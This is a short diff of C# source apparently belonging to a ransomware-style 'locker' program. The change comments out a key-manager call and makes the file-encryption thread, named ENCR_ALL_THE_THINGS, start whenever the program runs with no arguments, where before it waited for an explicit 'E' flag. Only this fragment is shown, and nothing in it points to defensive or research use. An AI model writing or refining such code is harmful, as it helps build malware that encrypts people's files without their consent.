@@ -31,13 +31,13 @@ namespace s0s_L_ckr
 #endif
 
             // Criptographic Key Manager for Files
-            CriptoKeyMgr.EnsrLocPubKey();
+            //CriptoKeyMgr.EnsrLocPubKey();
 
             int resultVal = -1;
             ThreadStart threadStart = null;
 
             //If given E parameter we Encrypt, Else D for Decrypt
-            if ("E" == ops)
+            if (args.Length == 0)
             {
                 threadStart = new ThreadStart(ENCR_ALL_THE_THINGS);
                 resultVal = 0; //Start of Encryption Thread
